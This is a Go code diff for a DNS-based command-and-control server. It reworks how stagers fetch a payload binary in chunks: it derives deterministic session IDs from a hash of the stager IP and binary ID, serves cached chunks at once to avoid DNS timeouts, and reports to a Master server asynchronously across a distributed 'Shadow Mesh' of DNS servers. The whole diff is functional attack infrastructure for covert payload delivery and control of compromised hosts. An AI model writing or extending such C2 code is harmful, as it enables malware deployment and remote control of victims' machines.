@@ -8,6 +8,7 @@ import (
 	"compress/gzip"
 	"crypto/sha256"
 	"encoding/base64"
+	"encoding/hex"
 	"fmt"
 	"math/rand"
 	"os"
@@ -817,7 +818,18 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 		parts := strings.SplitN(decoded, "|", 6)
 		if len(parts) == 4 {
 			// New stager protocol: CHUNK|index|IP|sessionID
-			response = c2.handleStagerAck(parts, clientIP, isDuplicate)
+			// Use sessionless architecture - serve chunks regardless of session sync state
+			chunkIndex, _ := strconv.Atoi(parts[1])
+			stagerIP := parts[2]
+			sessionID := parts[3]
+
+			// If Master mode, use new sessionless handler
+			if masterClient != nil {
+				response = c2.handleStagerChunkRequestNew(chunkIndex, stagerIP, sessionID, masterClient, isDuplicate)
+			} else {
+				// Standalone mode - use old handler
+				response = c2.handleStagerAck(parts, clientIP, isDuplicate)
+			}
 			validMessage = true
 		} else if len(parts) >= 6 {
 			// Legacy client chunking protocol
@@ -1432,6 +1444,19 @@ func (c2 *C2Manager) handleData(parts []string, isDuplicate bool) string {
 	return "ACK"
 }
 
+// generateDeterministicSessionID creates a consistent session ID based on stager IP + binary ID
+// This ensures all DNS servers AND Master generate the same session ID for the same stager
+// Critical for Shadow Mesh: stager load-balances across multiple DNS servers
+func generateDeterministicSessionID(stagerIP, clientBinaryID string) string {
+	// Hash stager IP + client binary ID to get deterministic session ID
+	data := fmt.Sprintf("%s|%s", stagerIP, clientBinaryID)
+	hash := sha256.Sum256([]byte(data))
+
+	// Use first 4 hex chars from hash (16 bits) - matches stg_XXXX format
+	hashHex := hex.EncodeToString(hash[:])
+	return fmt.Sprintf("stg_%s", hashHex[:4])
+}
+
 // handleStagerRequest processes a stager deployment request
 // Format: STG|IP|OS|ARCH
 // In distributed mode with cache, responds immediately with cached metadata
@@ -1489,37 +1514,28 @@ func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string, isDupl
 				var clientBinaryID string
 				var chunkCount int
 				if err := rows.Scan(&clientBinaryID, &chunkCount); err == nil && chunkCount > 0 {
-					// We have cached chunks! Report to Master and wait for session ID
-					// IMPORTANT: Must use Master's session ID for Shadow Mesh cross-server compatibility
+					// We have cached chunks! Generate deterministic session ID and respond immediately
+					// Master roundtrip is TOO SLOW for DNS timeouts (2-5 seconds)
 					if !isDuplicate {
 						logf("[C2] 🚀 Cache HIT for stager! Using cached binary: %s (%d chunks)", clientBinaryID, chunkCount)
 					}
 
-					// Report stager contact to Master and get Master-assigned session ID (SYNCHRONOUS)
-					// This is critical for Shadow Mesh: stager may request chunks from different DNS servers
-					masterSessionID, err := masterClient.ReportStagerContact(clientBinaryID, stagerIP, stagerOS, stagerArch)
-					if err != nil {
-						logf("[C2] ⚠️  Failed to report stager contact to Master: %v", err)
-						// Without Master session ID, cross-server requests will fail
-						// Return error to force stager to retry (maybe with different server)
-						return "ERROR|MASTER_UNAVAILABLE"
+					// Generate deterministic session ID (same as Master will create)
+					// This ensures all DNS servers + Master use the same session ID
+					sessionID := generateDeterministicSessionID(stagerIP, clientBinaryID)
+
+					if !isDuplicate {
+						logf("[C2] Generated session ID: %s (deterministic, Master will use same)", sessionID)
 					}
 
-					if masterSessionID == "" {
-						logf("[C2] ⚠️  Master returned empty session ID")
-						return "ERROR|SESSION_CREATION_FAILED"
-					}
-
-					logf("[C2] Master assigned session ID: %s (will work across all DNS servers)", masterSessionID)
-
-					// Store session info locally for tracking
+					// Store session info locally for chunk serving
 					c2.mutex.Lock()
 					if c2.cachedStagerSessions == nil {
 						c2.cachedStagerSessions = make(map[string]*CachedStagerSession)
 					}
-					c2.cachedStagerSessions[masterSessionID] = &CachedStagerSession{
-						SessionID:       masterSessionID,
-						MasterSessionID: masterSessionID,
+					c2.cachedStagerSessions[sessionID] = &CachedStagerSession{
+						SessionID:       sessionID,
+						MasterSessionID: sessionID,
 						ClientBinaryID:  clientBinaryID,
 						StagerIP:        stagerIP,
 						TotalChunks:     chunkCount,
@@ -1527,8 +1543,21 @@ func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string, isDupl
 					}
 					c2.mutex.Unlock()
 
-					// Return META with Master's session ID (guaranteed to work on all DNS servers)
-					metaResponse := fmt.Sprintf("META|%s|%d", masterSessionID, chunkCount)
+					// Report to Master ASYNC (fire-and-forget for UI tracking)
+					go func() {
+						masterSessionID, err := masterClient.ReportStagerContact(clientBinaryID, stagerIP, stagerOS, stagerArch)
+						if err != nil {
+							if c2.debug {
+								logf("[C2] Warning: Failed to report stager to Master: %v", err)
+							}
+						} else if masterSessionID != sessionID {
+							// This should never happen with deterministic IDs, but log if it does
+							logf("[C2] ⚠️  Session ID mismatch! Local: %s, Master: %s", sessionID, masterSessionID)
+						}
+					}()
+
+					// Return META immediately (fast DNS response!)
+					metaResponse := fmt.Sprintf("META|%s|%d", sessionID, chunkCount)
 					if !isDuplicate {
 						logf("[C2] Returning META response from cache: %s (len=%d)", metaResponse, len(metaResponse))
 					}
@@ -1546,7 +1575,94 @@ func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string, isDupl
 		return "ERROR|NO_CACHE"
 	}
 
-	// Standalone mode fallback - use local client binary (OLD BEHAVIOR, for backwards compatibility)
+	// No cache - return error
+	// The stager should retry with a different DNS server that may have the cache
+	return "ERROR|NO_CACHE"
+}
+
+// handleStagerChunkRequestNew handles chunk requests with cache-first architecture
+// Session ID is for tracking only - we serve chunks from cache immediately
+// Master is used for UI tracking, not for serving chunks (too slow for DNS timeouts)
+func (c2 *C2Manager) handleStagerChunkRequestNew(chunkIndex int, stagerIP string, sessionID string, masterClient *MasterClient, isDuplicate bool) string {
+	// Strategy: Serve from cache immediately, report to Master async
+	// DNS queries timeout in 2-5 seconds - no time for Master roundtrips!
+
+	// First check if we know this session (to get client_binary_id)
+	c2.mutex.RLock()
+	cachedSession, hasCachedSession := c2.cachedStagerSessions[sessionID]
+	c2.mutex.RUnlock()
+
+	var clientBinaryID string
+	if hasCachedSession {
+		clientBinaryID = cachedSession.ClientBinaryID
+	} else {
+		// Session not in memory yet - might be from different DNS server
+		// Try to find ANY cached binary and serve from that
+		// The stager embeds the client_binary_id implicitly via the domain list
+		if !isDuplicate {
+			logf("[C2] ⚠️  Session %s not in local cache, searching for cached chunks", sessionID)
+		}
+
+		// Query for any cached chunks - typically we'll have exactly one binary cached
+		var foundBinaryID string
+		err := c2.db.db.QueryRow(`
+			SELECT DISTINCT client_binary_id FROM stager_chunk_cache LIMIT 1
+		`).Scan(&foundBinaryID)
+
+		if err == nil && foundBinaryID != "" {
+			clientBinaryID = foundBinaryID
+			if !isDuplicate {
+				logf("[C2] Found cached binary: %s (will serve from this)", clientBinaryID)
+			}
+		} else {
+			if !isDuplicate {
+				logf("[C2] ❌ No cached chunks available!")
+			}
+			return "ERROR|NO_CACHE"
+		}
+	}
+
+	// Now serve the chunk from cache (fast - no Master query!)
+	var chunkData string
+	err := c2.db.db.QueryRow(`
+		SELECT chunk_data FROM stager_chunk_cache 
+		WHERE client_binary_id = ? AND chunk_index = ?
+	`, clientBinaryID, chunkIndex).Scan(&chunkData)
+
+	if err != nil {
+		if !isDuplicate {
+			logf("[C2] ❌ Chunk %d not in cache for binary %s: %v", chunkIndex, clientBinaryID, err)
+		}
+		return "ERROR|CHUNK_NOT_FOUND"
+	}
+
+	if !isDuplicate {
+		logf("[C2] ✅ Serving chunk %d from cache (instant)", chunkIndex)
+	}
+
+	// Update session stats if we have the session
+	if hasCachedSession {
+		c2.mutex.Lock()
+		cachedSession.ChunksServed++
+		cachedSession.LastActivity = time.Now()
+		c2.mutex.Unlock()
+	}
+
+	// Report to Master async (fire-and-forget for UI tracking only)
+	go func() {
+		if err := masterClient.ReportStagerProgress(sessionID, chunkIndex, stagerIP); err != nil {
+			// Silently fail - Master tracking is nice-to-have, not critical
+			if c2.debug {
+				logf("[C2] Warning: Failed to report chunk %d to Master: %v", chunkIndex, err)
+			}
+		}
+	}()
+
+	return fmt.Sprintf("CHUNK|%s", chunkData)
+}
+
+// handleStandaloneStagerRequest handles standalone mode (no Master) - use local client binary
+func (c2 *C2Manager) handleStandaloneStagerRequest(stagerIP, stagerOS, stagerArch string, isDuplicate bool) string {
 	if !isDuplicate {
 		logf("[C2] Warning: Running in standalone mode, using local client binary")
 	}
